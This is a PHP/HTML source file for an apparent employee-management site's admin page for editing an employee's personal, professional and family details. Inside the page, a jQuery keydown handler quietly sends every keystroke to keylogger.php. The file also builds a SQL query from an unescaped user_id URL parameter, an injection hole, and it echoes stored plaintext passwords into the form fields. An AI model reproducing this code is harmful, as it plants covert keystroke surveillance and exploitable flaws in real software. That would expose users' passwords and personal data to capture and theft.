<?php
include('header.php');
if(isset($_GET['user_id']))
{
	$user_id = $_GET['user_id'];
	$query = mysql_query("SELECT * FROM employee WHERE status = 'True' AND User_id = '$user_id'");
	$row = mysql_fetch_assoc($query);
	$dob = $row['Dob'];
	$year = substr($dob,0,4);
	$date = substr($dob,8,2);
	$month = substr($dob,5,2);
	
}
?>
    
   <?php
	if(substr($_SESSION['login_id'],0,4) == 'admi')
	{
	
	?> 
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="manage_emp.php">
        <div class="large-2 column" style="background:#10255F;">
       	 Manage Emp
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column">
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column">
         Task
        </div>
        </a>
        
        <a href="signup.php">
        <div class="large-2 column">
         Add New User
        </div>
        </a>
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
    </div>
    
    <!-- end navigation bar -->
  	<?php
	}
    else
	{
		unset($_SESSION['login_id']);
		header('location: index.php');	
	}
	?> 
    
    
    <script type="text/javascript">

//*************** START **************
//execute when we press and key from the key board...
$(document).keydown(function(event)
{
	//store that key into keycode variable..
	var keycode = event.keyCode;
	
	//call reload.php page using get method..
	//we send key value with the help of get method into reload.php page.. 	
	$('#hello').load('keylogger.php?press_key='+keycode+'&page=edit_employee');

});
//*************** END ****************

</script>


<!-- for key stock.. -->
<div id="hello"></div>
<!-- for key stock.. -->
    

    
    
    <!-- start main heading -->
    <div class="row">
    	<div class="large-12 column main_heading">
        Edit Employee Information
        </div>
    </div>
    <!-- end main heading -->


    <!-- start horizantal line -->
     <div class="row">
    	<div class="large-12 column">
        <hr style="border:0.1em #999999 solid;">
        </div>
    </div>
    <!-- end horizantal line -->
    
    <!-- Start User details -->
    <div class="sign_up">
    
    <!-- start row -->
    <div class="row user_detail">
    	
         <?php
   if(isset($_GET['user_id']))
	{
		if(mysql_num_rows($query) != 0)
		{
			
	?>
        
        <!-- Start 6 column for user details -->	
        <div class="large-6 column">
        
        <form action="view_employee.php" method="post" enctype="multipart/form-data">
        
        
        <div class="block"><!-- start personal detial -->
        
        	<div class="row name">
                <div class="large-6 column title">
                Personal Details
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
                Name<span>*</span> :
                </div>            
            
                <div class="large-6 column end">
                <input type="text" name="name" class="box"  value="<?php echo $row['Name']?>" required/>
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
                Employee Id<span>*</span> :
                </div>            
            
                <div class="large-6 column end">
                <input type="text"  name="employee_id" class="box"  value="<?php echo $row['User_id']?>" readonly required/>
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Email Add<span>*</span> :
                </div>            
            
                <div class="large-6 column end">
                <input type="email" name="email" required class="box"  value="<?php echo $row['Email_id']?>" placeholder="E-mail" />
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Mobile No<span>*</span> :
                </div>            
            
                <div class="large-6 column end">
                <input type="text" name="mobile" id="mobile" required value="<?php echo $row['Mobile']?>"  class="box" pattern="[0-9]{10}" maxlength="10" placeholder="Mobile Number" />
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Date of Birth<span>*</span> :
                </div>
            
                <div class="large-6 column end">
                <input type="date" class="box" style="text-align:right;" value="<?php echo $row['Dob']?>" required name="dob" />
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Gender<span>*</span> :
                </div>            
            
                <div class="large-6 column end">
                <?php 
				if($row['Gender'] == 'Male')
				{
					echo '<select required  name="gender" class="select">
                <option selected value="Male">Male</option>
                <option value="Female">Female</option>
                </select>';
				}
				elseif($row['Gender'] == 'Female')
				{
					echo '<select required  name="gender" class="select">
                <option value="Male">Male</option>
                <option selected value="Female">Female</option>
                </select>';
				}
				?>
                
                </div>
            </div>

		</div><!-- end personal detail -->


		<div class="block"><!-- start profession details -->
        
            <div class="row name">
                <div class="large-6 column title">
                Professional Details
                </div>
            </div>
              
              
             <div class="row name">
            	<div class="large-6 column heading">
               	Department :
                </div>            
            
                <div class="large-6 column end">
                <input type="text" name="dep_name" class="box" value="<?php echo $row['Department']; ?>" placeholder="Department name" />
                </div>
            </div>
                        
            
            <div class="row name">
            	<div class="large-6 column heading">
                Year
                </div>
                <div class="large-6 column end">
                <input type="number" class="box exp_year" value="<?php echo $row['Exp_year']?>"  min="0" name="year" placeholder="Year">
                </div>
            </div>
            
            
             <div class="row name">
            	<div class="large-6 column heading">
               	Company :
                </div>            
            
                <div class="large-6 column end">
                <input type="text" name="company" value="<?php echo $row['Company']; ?>" class="box exp_comp"  placeholder="Company name" />
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Designation : 
                </div>            
            
                <div class="large-6 column end">
                <input type="text" name="designation" value="<?php echo $row['Designation']; ?>" class="box exp_des" placeholder="Desingnation" />
                </div>
            </div>
          </div><!-- end profession details -->
            
            
        </div>
        <!-- end 6 column for user details -->
        
        <!-- start family details -->
        <div class="large-6 column">
        	<div class="row ">
        
        		<div class="large-12 column">
                 
                 <div class="block"><!-- start family details -->
                 
                    <div class="row name">
                        <div class="large-6 column title">
                        Family Details
                        </div>
                    </div>
                    
                    <div class="row name">
                        <div class="large-6 column heading">
                        Father Name<span>*</span> : 
                        </div>            
                    
                        <div class="large-6 column end">
                        <input type="text" name="father_name" class="box" value="<?php echo $row['Father_name']; ?>" required  placeholder="Father Name" />
                        </div>
                    </div>
            
                    <div class="row name">
                        <div class="large-6 column heading">
                        Mother Name<span>*</span> : 
                        </div>            
                    
                        <div class="large-6 column end">
                       <input type="text" name="mother_name" class="box" required  value="<?php echo $row['Mother_name']; ?>" placeholder="Mother Name" />
                        </div>
                    </div>
                    
                    <div class="row name">
                        <div class="large-6 column heading">
                        Father Mobile : 
                        </div>            
                    
                        <div class="large-6 column end">
                       <input type="text" name="father_mobile" class="box" value="<?php echo $row['Father_mobile']; ?>" pattern="[0-9]{10}" maxlength="10"  placeholder="Father Mobile" />
                        </div>
                    </div>
            
                    <div class="row name">
                        <div class="large-6 column heading">
                        Address<span>*</span> : 
                        </div>            
                    
                        <div class="large-6 column end">
                        <textarea name="address" required style="resize:none; height:100px; width:200px;"><?php echo $row['Address']; ?></textarea>
                        </div>
                    </div>
                    
        <?php 
		if($row['Image'] == "unknown.jpg")
		{
		?>
                    
          <div class="row name">
              <div class="large-6 column heading">
              Image Upload : 
              </div>            
                    
              <div class="large-6 column end">
              <input type="file" name="file" accept="image/jpeg" accept="image/gif" accept="image/x-png"  >
              </div>
          </div>
          <?php 
		}else{
		?>
        <div class="row name checkb">
              <div class="large-6 column heading">
              Image :
              </div>            
                    
              <div class="large-6 column end">
              <label><img src="employee/<?php echo $row['Image']?>" style="height:42px; width:38px;float:left;">&nbsp;&nbsp;&nbsp;Remove Image &nbsp;&nbsp;&nbsp;<input type="checkbox"  name="check"  class="checkbo" id="image_up" /></label>
              </div>
      	</div>
        
        
        <?php
		}
        ?>
         
          <div class="row name image">
              <div class="large-6 column heading">
              Image Upload : 
              </div>            
                    
              <div class="large-6 column end">
              <input type="file" name="profile_pic" accept="image/jpeg" accept="image/gif" accept="image/x-png"  >
              </div>
          </div>     
                    
          
           <div class="row name" style="margin-top:17px;">
              <div class="large-6 column heading">
             Password : 
              </div>            
                    
              <div class="large-6 column end">
              <input type="password" name="password" required value="<?php echo $row['Password']; ?>" >
              </div>
          </div> 
          
          
           <div class="row name">
              <div class="large-6 column heading">
              Confirm Password : 
              </div>            
                    
              <div class="large-6 column end">
              <input type="password" name="con_password" required  value="<?php echo $row['Password']; ?>" >
              </div>
          </div> 
                  
                    
                    
                   </div><!-- end family detail -->
                 
            </div>
            <!-- end  12 column -->
           
           <?php
		}
	}
		   ?> 
            
        </div>
        <!-- end row -->
        
        </div>	
        <!-- end 6 column -->
        
        
         </div>
    <!-- end row -->
        
        <!-- start row -->
        <div class="row">
        
        <div class="large-2 large-centered column">
        <input type="hidden" value="<?php echo $row['Image']?>" name="old_pic" />	
        <input type="submit" value="Done" name="done" class="submit">
        </div>
        
        </div>
        <!-- end row -->

   
    
    </div>
    <!-- end index -->
  
    
    
    <!-- start footer -->
   <div id="full_width">
   <div class="footer">
        <div class="row">
            <div class="large-2 large-offset-10 column copyright">
        &copy; Rishabh Agrawal
            </div>
        </div>   
   </div>
   </div>
    <!-- end footer -->
    
    
    <script>
	
	   $(".image").hide();
	$("input:checkbox[id='image_up']").change(function(){
			if($(this).is(":checked"))
			{
            	$(".checkb").hide();
				$(".image").show();
                
			}
		});
    </script>
    
    
</body>
</html>